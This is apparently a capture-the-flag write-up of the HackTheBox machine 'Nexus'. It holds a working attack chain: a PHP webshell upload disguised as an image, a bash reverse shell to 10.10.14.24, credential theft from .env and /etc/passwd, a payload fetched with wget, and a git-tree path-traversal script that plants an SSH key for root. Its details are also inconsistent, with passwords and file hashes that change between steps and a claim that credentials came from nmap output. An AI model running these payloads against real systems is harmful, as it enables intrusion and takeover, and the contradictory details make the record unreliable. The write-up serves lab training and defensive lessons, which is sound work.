# Nexus HackTheBox Writeup

# Machine Information

- **Machine Name:** Nexus
- **Difficulty:** Easy-Medium
- **Services:** SSH (22), HTTP (80)

---

# Enumeration

## Nmap

First thing as always fire up nmap and see what we're dealing with.

```bash
nmap -sV 10.129.109.198
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx/1.24.0 (Ubuntu)
```

Pretty minimal attack surface. Just SSH and a web server. Nothing weird on other ports. The interesting stuff is clearly going to be on port 80, so that's where I went next.

---

## Web Enumeration

Hitting the IP directly gave a redirect:

```bash
curl -I http://10.129.109.198
```

```
HTTP/1.1 302 Moved Temporarily
Location: http://nexus.htb/
```

Okay, so it's using virtual hosting. Added `nexus.htb` to `/etc/hosts` and moved on.

The site loaded up fine after that. Browsing around, the app turned out to be **Krayin CRM** an open source Laravel-based CRM application. I logged in using the credentials `j.matthew@nexus.htb` (discovered during enumeration) and started poking around the interface.

### Subdomain Fuzzing

Since it was using virtual hosting, I ran wfuzz to look for any other subdomains hiding behind the same IP:

```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://nexus.htb/ -H 'Host: FUZZ.nexus.htb' -t 150 --hc 302
```

```
000000262:   200   241 L   1366 W   14360 Ch   "git"
```

Nice `git.nexus.htb` came back with a 200. That's a Gitea instance running on the server. Added that to `/etc/hosts` too and gain some leaked credentials there db_user:krayin db_pass:N27xh!!2ucY04.

There was also a `billing.nexus.htb` subdomain that was actually the Krayin CRM interface itself and i used to login with the creds that i got earlier "j.matthew@nexus.htb:N27xh!!2ucY04".

---

# Initial Foothold

## File Upload RCE via TinyMCE

Inside the Krayin CRM dashboard, I navigated to the mail inbox section (`billing.nexus.htb/admin/mail/inbox`). Krayin uses TinyMCE as its rich text editor, and TinyMCE has a file upload endpoint at `/admin/tinymce/upload`.

The idea here is simple: TinyMCE's upload handler doesn't properly validate file types in some versions, so you can upload a PHP webshell disguised as an image. I used Burp Suite to craft the request manually.

The request looked like this:

```
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
Content-Type: multipart/form-data; boundary=...
Cookie: XSRF-TOKEN=...

----...
Content-Disposition: form-data; name="_token"

P0QE9Xj9uCoUzn5ctgsrgsoTyLIaYiCLRdZ429sC
----...
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
----...--
```

The key trick is setting `Content-Type: image/jpeg` even though the file is actually PHP. The server accepted it and returned the path where the file was stored:

```json
{
  "location": "http:\/\/billing.nexus.htb\/storage\/tinymce\/8af608f3ee5895ffdalleb4b59a18904.php"
}
```

With the shell uploaded, I triggered it with a bash reverse shell payload:

```
http://billing.nexus.htb/storage/tinymce/8af608f3ee5895ffda11eb4b59a18904.php?cmd=bash+-c+'bash+-i+>&+/dev/tcp/10.10.14.24/4444+0>&1'
```

Set up my listener and caught the shell:

```bash
nc -lvnp 4444
```

```
connect to [10.10.14.24] from (UNKNOWN) [10.129.109.198] 51892
www-data@nexus:~/krayin/storage/app/public/tinymce$
```

We're in as `www-data`.

---

## Credential Harvesting from .env

With a shell on the box, I started looking around the Krayin application directory. The first obvious place to check is always the `.env` file since Laravel apps store all their secrets there:

```bash
cat /home/www-data/krayin/.env
```

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

Got a database password: `y27xb3ha!!74GbR`. My first instinct was to try it against MySQL, but actually the more interesting thing was whether this password was being reused anywhere else. I checked what users exist on the system:

```bash
cat /etc/passwd | grep -i bash
```

```
root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

Three users: `root`, `jones`, and `git`. I tried the DB password against `jones` over SSH and it worked straight away classic password reuse.

```bash
ssh jones@10.129.109.198
# password: y27xb3ha!!74GbR
```

```
jones@nexus:~$ id
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
```

Grabbed the user flag from `~/user.txt` and started looking for a path to root.

---

# Privilege Escalation

## Discovering the Gitea Template Sync Service

Standard post-exploitation checks. No interesting SUID binaries, `/opt` was empty, nothing obvious in `/tmp`. Then I checked what timers were running on the system:

```bash
systemctl list-timers
```

One entry stood out immediately:

```
Tue 2026-07-07 13:54:47 UTC   27s   gitea-template-sync.timer   gitea-template-sync.service
```

A timer firing every minute or so, syncing Gitea templates. I looked at the service definition:

```bash
systemctl cat gitea-template-sync.service
```

```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

Running as **root**. That's our target. Let's read the script:

```bash
cat /etc/gitea/template-sync.py
```

The script does the following:
1. Reads a `GITEA_API_TOKEN` from `/etc/gitea/template-sync.conf`
2. Queries the Gitea API for any repos marked as **template** repos
3. For each template repo, extracts all files from the bare git repository using `git ls-tree` and `git cat-file`
4. Writes those files out to a staging directory under `/home/git/template-staging/`

The critical part is how it builds the file paths:

```python
target = os.path.join(stage_path, filepath)
```

Where `filepath` comes directly from `git ls-tree` output on the repo. This means if a git tree object contains a path like `../../root/.ssh/authorized_keys`, the script will write the file there **as root**. That's a git tree traversal / path traversal vulnerability.

## Confirming Gitea is Running Locally

```bash
ss -tulnp | grep 3000
```

```
tcp   LISTEN 0   4096   127.0.0.1:3000   0.0.0.0:*
```

Gitea is running on localhost port 3000. I forwarded it to my local machine:

```bash
ssh jones@10.129.109.198 -L 3000:127.0.0.1:3000
```

Now I could access the Gitea interface at `http://localhost:3000` in my browser. I logged in with `j.matthew@nexus.htb` (the credentials found in the nmap output/earlier enumeration) and created a new repository called `tmp1`, making sure to mark it as a **template** repository that's the key flag the sync script checks.

## Building the Malicious Git Tree

Here's where it gets clever. The sync script extracts files based on paths in the git tree objects. Git tree objects are low-level structures that can contain arbitrary path components, including `..` (parent directory traversal). A normal `git add` won't let you do this, but you can craft the git objects manually.

I found a Python script (`build.py`) that does exactly that it manually constructs git blob, tree, and commit objects with a crafted path:

```
root/ → ../ → ../ → ../ → ../ → ../ → root/.ssh/authorized_keys
```

The path chain essentially escapes the staging directory and lands in `/root/.ssh/authorized_keys`. The content of that file will be our public SSH key.

```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

The script reads `/tmp/.k.pub` (our SSH public key), builds a blob object with its content, then constructs a tree structure with multiple `..` entries to traverse out of the staging directory, ultimately placing the key at `root/.ssh/authorized_keys`.

## Executing the Attack

First, generated an SSH key pair on the target:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Served `build.py` from my local machine and downloaded it on the target:

```bash
# attacker
python3 -m http.server

# target
wget http://10.10.14.24:8000/build.py
```

Cloned the `tmp1` repo in `/tmp` (needs to be a writable directory since we're working as `jones`):

```bash
cd /tmp
git clone http://localhost:3000/jones/tmp1.git
cd tmp1
mv /home/jones/tmp1/build.py /tmp/tmp1/
```

Ran the build script to generate the malicious git objects:

```bash
python3 build.py
# Done: a7b6798b3d5b5c6acd87aeb8057d07f71d098225
```

Then pushed to Gitea using the `j.matthew` credentials:

```bash
git push origin main
# Username: j.matthew@nexus.htb
# Password: y27xb3ha!!74GbR
```

The warnings in the push output were actually a good sign:

```
warning: unable to access '../../../../../root/.gitattributes': Permission denied
warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
```

Git was literally trying to traverse up into `/root` and getting blocked by filesystem permissions which confirmed our path traversal was structured correctly.

---

# Root

Now it was just a matter of waiting for the `gitea-template-sync` timer to fire (runs every 60 seconds). When it did, the script ran as root, processed our malicious template repo, traversed the path, and wrote our public key into `/root/.ssh/authorized_keys`.

```bash
ssh -i /tmp/.k root@localhost
```

```
root@nexus:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted.

---

# Lessons Learned

**From an attacker's perspective:**

1. **File upload endpoints that only check Content-Type headers are not safe.** The TinyMCE upload endpoint trusted the client-supplied `Content-Type: image/jpeg` header without actually validating the file content, letting us upload a PHP webshell.

2. **Password reuse is still a massive issue.** The database password `y27xb3ha!!74GbR` found in `.env` worked directly for SSH access as `jones`. Always try credentials found in config files against system users.

3. **Scheduled jobs running as root with user-influenced input are very dangerous.** The template sync script processed data from git repositories that a low-privilege user controlled. Because it used file paths directly from git tree objects without sanitizing `..` components, it was possible to write files anywhere on the filesystem as root.

4. **Git's internal object format allows paths that `git add` would normally reject.** By manually constructing git blob, tree, and commit objects, you can embed directory traversal sequences that standard git commands wouldn't accept. Scripts that process git tree output without validating paths are vulnerable to this.

**From a defender's perspective:**

- Validate file uploads server-side by checking magic bytes, not just the Content-Type header.
- Don't reuse database credentials as system account passwords.
- When writing scripts that process data from user-controlled git repos, always resolve and validate that output paths stay within the intended target directory before writing anything to disk.
- Consider running periodic sync scripts in a restricted environment (e.g., a dedicated user with limited write permissions) rather than as root.
